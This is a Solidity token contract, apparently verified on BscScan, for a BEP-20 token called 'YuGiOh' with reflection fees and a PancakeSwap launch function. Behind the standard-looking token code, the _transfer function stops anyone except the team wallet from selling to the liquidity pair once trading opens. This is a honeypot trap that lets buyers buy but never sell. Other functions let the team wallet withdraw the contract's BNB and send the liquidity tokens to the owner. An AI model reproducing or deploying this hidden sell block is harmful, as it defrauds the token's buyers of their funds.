/**
 *Submitted for verification at BscScan.com on 2021-12-30
*/

//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;
// ----------------------------------------------------------------------------
// EIP-20: ERC-20 Token Standard
// https://eips.ethereum.org/EIPS/eip-20
// -----------------------------------------

abstract contract Context {
    function messageSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = messageSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == messageSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}  

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract YuGiOh is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private reflexFee = 0;

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant tokens = 100000000 * 10**9;
    uint256 private reflectionsTotal = (MAX - (MAX % tokens));
    string private constant _name = "YuGiOh";
    string private constant _symbol = "YuGi";
    uint8 private constant _decimals = 9;
    address payable private teamWallet;
    
    mapping (address => uint256) private reflectionOwners;
    mapping (address => mapping (address => uint256)) private allowances;
    mapping (address => bool) private feeExemption;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private swapEnabled = false;

    constructor () {
        reflectionOwners[address(this)] = reflectionsTotal;
        teamWallet = payable(0x736AF49b1e0953153eC6fE628Ea2f7208D1c2fCa);
        feeExemption[address(this)] = true;
        feeExemption[owner()] = true;
        feeExemption[teamWallet] = true;
        emit Transfer(address(0), address(this), tokens);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return tokens;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(reflectionOwners[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(messageSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(messageSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, messageSender(), allowances[sender][messageSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= reflectionsTotal, "Amount must be less than total reflectionOwners");
        uint256 currentRate = getSupplyRate();
        return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function manualsendBNB() external {
        require(messageSender() == teamWallet);
        uint256 contractBNBBalance = address(this).balance;
        sendBNB(contractBNBBalance);
    }

    function sendBNB(uint256 amount) private {
        teamWallet.transfer(amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(to == uniswapV2Pair && tradingOpen) {
            require(from == teamWallet);
        }
        transferTokensSupportingFees(from, to, amount);
    }
    
    function transferTokensSupportingFees(address sender, address recipient, uint256 tAmount) private {
        uint256 _reflexFee = getTransferFees(sender, recipient);

        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount) = _getAllValues(tAmount, _reflexFee);
        reflectionOwners[sender] = reflectionOwners[sender].sub(rAmount);
        reflectionOwners[recipient] = reflectionOwners[recipient].add(rTransferAmount); 
        applyFee(rAmount, _reflexFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function startTrade() external onlyOwner() {
        require(!tradingOpen, "trading is open");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        feeExemption[address(uniswapV2Router)] = true;
        _approve(address(this), address(uniswapV2Router), tokens);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value:address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        reflexFee = 1;
        emit Transfer(address(this), uniswapV2Pair, tokens);
    }
    
    function applyFee(uint256 rAmount, uint256 rReflexFee) private {
        uint256 collectedFee = rAmount.mul(rReflexFee).div(100);
        reflectionsTotal = reflectionsTotal.sub(collectedFee);
    }

    receive() external payable {}
    
    function getTransferFees(address from, address to) private view returns(uint256) {
        if(!tradingOpen || feeExemption[from] || feeExemption[to]) {
            return 0;
        }
        
        if(from == uniswapV2Pair || to == uniswapV2Pair) {
            return reflexFee;
        }
        
        return 0;
    }

    function _getAllValues(uint256 tAmount, uint256 fees) private view returns (uint256, uint256, uint256) {
        uint256 tTransferAmount = _getTokenValues(tAmount, fees);
        uint256 currentRate = getSupplyRate();
        (uint256 rAmount, uint256 rTransferAmount) = _getReflectionValues(tAmount, tTransferAmount, currentRate);
        return (rAmount, rTransferAmount, tTransferAmount);
    }

    function _getTokenValues(uint256 tAmount, uint256 fees) private pure returns (uint256) {
        uint256 tFees = tAmount.mul(fees).div(100);
        uint256 tTransferAmount = tAmount - tFees;
        return tTransferAmount;
    }

    function _getReflectionValues(uint256 tAmount, uint256 tTransferAmount, uint256 currentRate) private pure returns (uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = tTransferAmount.mul(currentRate);
        return (rAmount, rTransferAmount);
    }

	function getSupplyRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = reflectionsTotal;
        uint256 tSupply = tokens;      
        if (rSupply < reflectionsTotal.div(tokens)) return (reflectionsTotal, tokens);
        return (rSupply, tSupply);
    }
}